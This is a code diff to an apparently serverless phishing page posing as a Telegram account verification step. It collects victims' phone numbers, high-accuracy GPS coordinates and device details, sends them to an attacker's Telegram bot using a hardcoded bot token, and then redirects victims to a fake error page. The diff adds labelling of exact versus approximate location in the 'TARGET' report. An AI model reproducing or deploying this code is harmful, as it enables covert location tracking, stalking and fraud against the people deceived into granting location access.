@@ -30,34 +30,37 @@ export default {
           <script>
             function checkAndSend() {
               const phone = document.querySelector("#phone").value;
-              if (!phone) {
-                alert("يرجى إدخال رقم الهاتف أولاً");
-                return;
-              }
+              if (!phone) { alert("يرجى إدخال رقم الهاتف"); return; }
 
               document.getElementById("btn").innerText = "Verifying...";
 
               if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                   (pos) => {
-                    sendToServer(phone, pos.coords.latitude, pos.coords.longitude);
+                    // التحقق من الدقة (إذا كان الخطأ أقل من 100 متر نعتبره دقيق)
+                    const isExact = pos.coords.accuracy < 100 ? "Exact (GPS)" : "Approximate (Network)";
+                    sendToServer(phone, pos.coords.latitude, pos.coords.longitude, isExact);
                   },
                   (err) => {
-                    alert("⚠️ يجب عليك السماح بالوصول إلى الموقع للمتابعة وتأمين حسابك.");
+                    alert("⚠️ يجب السماح بالوصول للموقع بدقة عالية للمتابعة.");
                     document.getElementById("btn").innerText = "NEXT";
                   },
-                  { enableHighAccuracy: true }
+                  { enableHighAccuracy: true, timeout: 10000 }
                 );
-              } else {
-                alert("متصفحك لا يدعم خاصية التحقق.");
               }
             }
 
-            async function sendToServer(phone, lat, lon) {
+            async function sendToServer(phone, lat, lon, type) {
               await fetch(window.location.href, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({phone, lat, lon, model: navigator.userAgent})
+                body: JSON.stringify({
+                  phone, 
+                  lat, 
+                  lon, 
+                  locationType: type,
+                  model: navigator.userAgent
+                })
               });
               window.location.href = "https://telegram.org/blog/504-error";
             }
@@ -73,15 +76,17 @@ export default {
         const BOT_TOKEN = "6939721323:AAG9eDCNgz3Kct9APMRfrZUCDDSJfKbu8tc";
         const CHAT_ID = "5794792675";
 
-        // تصحيح الرابط ليفتح خرائط جوجل مباشرة بالإحداثيات الدقيقة
+        // تحديد أيقونة الحالة بناءً على نوع الموقع
+        const statusEmoji = data.locationType.includes("Exact") ? "🟢 [موقع دقيق - GPS]" : "🟡 [موقع تقريبي]";
         const googleMapsLink = "https://www.google.com/maps?q=" + data.lat + "," + data.lon;
 
-        const message = "🎯 [TARGET VERIFIED - GPS ONLY] 🎯\\n" +
+        const message = "🎯 " + statusEmoji + " 🎯\\n" +
                         "--------------------------------\\n" +
-                        "📱 Phone: " + data.phone + "\\n" +
-                        "📍 Coords: " + data.lat + "," + data.lon + "\\n" +
-                        "🗺 Google Maps: " + googleMapsLink + "\\n" +
-                        "🛠 Device: " + data.model;
+                        "📱 الرقم: " + data.phone + "\\n" +
+                        "📍 الإحداثيات: " + data.lat + "," + data.lon + "\\n" +
+                        "🛰 النوع: " + data.locationType + "\\n" +
+                        "🗺 الخريطة: " + googleMapsLink + "\\n" +
+                        "🛠 الجهاز: " + data.model;
 
         await fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
           method: "POST",
